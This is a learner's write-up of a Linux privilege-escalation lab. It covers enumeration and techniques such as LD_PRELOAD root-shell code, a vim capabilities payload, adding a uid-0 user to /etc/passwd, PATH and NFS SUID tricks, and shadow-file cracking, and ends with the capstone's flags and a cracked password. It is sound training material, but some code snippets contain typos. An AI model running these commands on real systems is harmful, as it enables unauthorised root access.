# Linux Privilege Escalation

### Task 2

What does "privilege escalation” mean?

At it's core, Provolege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, desgin flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

Why is it important?

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

- Resetting passwords
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistance
- Changing the privilege of existing (or new) users
- Execute any administrative command

### Task 3

Enumeration is the first step you have to take once you gain access to any system. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is important during the post-compromise phase as it is before.

hostname 

The hostname command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-347830239), in some cases, it can provide information about the target system's role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

uname -a

Will print system information giving additional detail about the kernel used by the target. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

/proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal. 

Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

/etc/issue

Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can be easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

ps Command

The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.

The output of the ps (Process Status) will show the following:

  

- PID: the process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
- CMD: The command or executable running (will NOT display any command line parameter)

The ps command provides a few useful options.

- ps -A: View all running processes
- ps axjf: View process tree (see the tree formation until ps axjf is run below)
- ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

env

The env command will show environmental variables.

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

sudo -l

The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

/etc/passwd

Reading the /etc/passwd file can be an easy way to discover users on the system.

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for a brute-force attack.

ifconfig

The ifconfig command will give us information about the network interfaces of the system. ip route command can be used to see which network routes exist.

netstat

Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The netstat command can be used with several different options to gather information on existing connections.

- netstat -a: shows all listening ports and established connections
- netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively
- netstat -l: list ports in "listening” mode. These ports are open and ready to accept incoming connections. This can be used with the "t” option to list only ports that are listening using the TCP protocol
- netstat -s: list network usage statistics by protocol. This can also be used with the -t or -u options to limit the output to a specific protocol.
- netstat -tp: list connections with the service name and PID information.
- netstat -i: shows interface statistics.

The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows:

- -a: Display all sockets
- -n: Do not resolve names
- -o: Display timers

find

The find command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the "find” command with "-type f 2>/dev/null” to redirect errors to /dev/null and have a cleaner output.

The SUID bit allows to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path.

find / -perm -u=s -type f 2>/dev/null

### Task 4

Several tools can help you sve time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. The target system's environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

- LinPeas
- LinEnum
- LES (Linux Exploit Suggester)
- Linux Smart Enumeration
- Linux Priv Checker

### Task 5

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulenrability, or in some cases by accessing another user account that has more privileges, information, or access.

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges. 

the kernel exploit methodology is simple;

1. Idenfity the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

Research sources:

1. Based on your findings, you can use Google to search for an existing exploit code.
2. Sources such as [https://www.cvedetails.com/](https://www.cvedetails.com/) can also be useful.
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negative (not report any kernel vulnerabilities although the kernel is vulnerable).

Hints / Notes:

1. Being to specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit 
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in firther use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environments,but these are absolute no-nos during real penetration testing engagement.
3. Some exploits may require further interaction once they run. Read all comments and instructions provided with the exploit code. 
4. You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.

### Task 6

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmao regularly but would not be cleared for full root access. in this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the sudo -l command.

GTFObins is a valuable source that porvides on how any program, on which you may have sudo rights, can be used.

Leverage application functions

Some applications will not have a known exploit within this context. Such an application you may see in the Apache2 server. 

In this case, we can use a "hack” to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f: specify an alternate ServerConfigFile).

Loading the /etc/shadow fiel using this option will result in an error message that includes the first line of the /etc/shadow file.

Leverage LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option.

LD_PRELOAD is a function that allows any program to use shared libraries. If the "env_keep” option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code complied as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>

#include <sys/types.h>

#include <stdlib.h>

void_init() {

unsetenv("LD_PRELOAD”);

setgid(0);

setuid(0);

system("/bin/bash”);

}

We can save this file as shell.c and compile it using gcc into a shared object file using the following parameters;

gcc -fPIC -shared -o [shell.so](http://shell.so) shell.c -nostartfiles

We can now use this shared object file when launching any program our user can run with sudo. in our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

### Task 7

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an "s” bit set showing their special permission level.

find / -type f -perm -04000 -ls 2>/dev/null — will list files that have SUID or SGID bits sets.

A good practice would be to compare executables on this list with GTFObins. Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set.

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner's privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd.

Below are simple steps using both vectors.

reading the /etc/shadow file

We see that nano text editor has the SUID bit set by running the fidn / -type f -perm -04000 -ls 2>/dev/null command.

nano /etc/shadow will print the contents of the /etc/shadow file. We can now use the unshadow tool to create a file crackable by John The Ripper. To achive this, unshadow needs both the /etc/shadow and /etc/passwd files.

The unshadow tool's usage can be seen below;

unshadow passwd.txt shadow.txt > passwords.txt

With the correct wordlist and a little luck, John The Ripper can return one or several passwords in cleartext. 

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

openssl passwd -1 -salt THM password1

We will then add this password with a username to the /etc/passwd file.

Once our user is added (please note how root:/bin/bash was used ti provide root shell) we will need ti switch to this user and hopefully should have root privileges.

hacker:[hash_value]:0:0:root:/root:/bin/bash  

### Task 8

Another method system administrators can use to increase the privilege level of a process or binary is "Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.

The capabilities man page provides detailed information on its usage and options. 

We can use the getcap tool to list enabled capabilities.

When run as an unprivileged user, getcap -r / will generate a huge amount or errors, so it is a good practice to redirect the error message to /dev/null.

Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

We notice that vim can be used with the following command and payload:

./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh”,  "sh”,  "-c”,  "reset; exec sh”)'’

This will launch a root shell. 

### Task 9

Cron jobs are used to run scripts or binaries at specific times. By default, they run wiht the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions. 

The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron jobs configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell. 

Any user can read the file keeping system-wide cron jobs under /etc/crontab .

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.

*  *  *  *  * 

1-star - minute

2-star - hour

3-star - day of month

4-star - month

5-star - day of week (0 - 6) (Sunday = 0 or 7)

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vetors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

1. System administrators need to run a script at regular intervals.
2. They create a cron job to do this
3. After a while, the script become useless, and they delete it 
4. They do not clean the relevant cron job

This change management issue leeds to a potential exploit leveraging cron jobs.

The example above shows a similar situation where the [antivirus.sh](http://antivirus.sh) script was deleted, but the cron job still exists. 

If the full path of the script is not defined (as it was done for the [backup.sh](http://backup.sh) script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script names "antivirus.sh” under our user's home folder and it should be run by the cron job. 

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

### Task 10

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

If we type "thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below trying this.

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script / application you can start that will be affected by this vulnerability?

For demo purposes, we will use the script below:

#include <unistd.h>

void main()

{ setuid(0);

setgid(0);

system("thm”);

}

This script tries to launch a system binary called "thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit.

gcc path.c -o path -w

chmod u+s path

Our user now has access to the "path” script with SUID bit set.

Once executed "path” will look for an executable named "thm" inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our "path” script run it. As the SUID bit is set, this binary will run with root privilege. 

A simple search for writable folders can be done using the "find / -writable 2>/dev/null” command. The output of this command can be cleaned using a simp,e cut and sort sequence.

find / -writable 2>/dev/null | cut -d "/” -f 2 | sort -u

Some CTF scenarios can present different folders but a regular system would output something like we see above.

Comparing this with PATH will help us find folders we could use.

Unfortunately, subfolders under /usr are not writable 

The folder that will be easier to write to is probably /tmp.  At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the "export PATH=/tmp:$PATH” command accomplishes this.

At this point the path script will also look under the /tmp folder for an executable named "thm".

Creating this command is fairly easy by copying /bin/bash as "thm” under the /tmp folder.

echo "/bin/bash” > thm

chmod 777 thm

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user's right. What makes a privilege escalation possible within this context is that the path script runs with root privileges. 

### Task 11

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user's privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during testing engagements when a network backup sistem is present. 

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the "no_root_squash” option. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the "no_root_squash” option is present on a writable share, we can create an executable eith SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.

showmount -e [ip_address]

We willl mount one of the "no_root_squash” shares to our attacking machine and start building our executable.

mkdir /tmp/backupsonattackmachine

mount -o rw [ip_address]:/backups /tmp/backupsonattackmachine

As we can set SUID bit, a simple executable that will run /bin/bash on the target system will do the job.

int main()

{ setgid(0);

setuid(0);

system("/bin/bash”);

return 0;

}

Once we compile the code we will set the SUID bit.

gcc nfs.c -o nfs -w

chmod +s nfs

You will see that both file (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.

### Task 12 - Capstone Challenge

What is the content of the flag1.txt?

Ans: THM-42828719920544

Solve: SSH into the machine with leonard's credentials. Found out that there are two users, leonard and missy. Checking for SUIDs (find / -type f -perm -04000 -ls 2>/dev/null) led me to finding a SUID binary /usr/bin/base64. Going to GTFObins leads to an SUID exploitation namely, base64 /etc/shadow | base64 —decode, that reads the password shadow file. I saved both of the shadow and passwd file on my machine, then I used unshadow passwd.txt shadow.txt > passwords.txt, in order to have something John The Ripper would understand, and finally I used John to try to crack the hashes for missy and root. (john passwords.txt)

Missy's password was cracked easily and fast, the result being Password1. Unfortunately, John wasn't of use for the root password. Changing the user to missy and loging with the password I found, made me found the flag1.txt. 

What is the content of the flag2.txt?

Ans: THM-168824782390238

Solve: Being logged as missy, run sudo -l. The output gives the answer, being that /usr/bin/find can be used as sudo, leading to the exploit found on GTFObins (sudo find . -exec /bin/sh \; -quit). After running the command the root shell will spawn and the only thing remaining is to read the flag stored into /home/rootflag.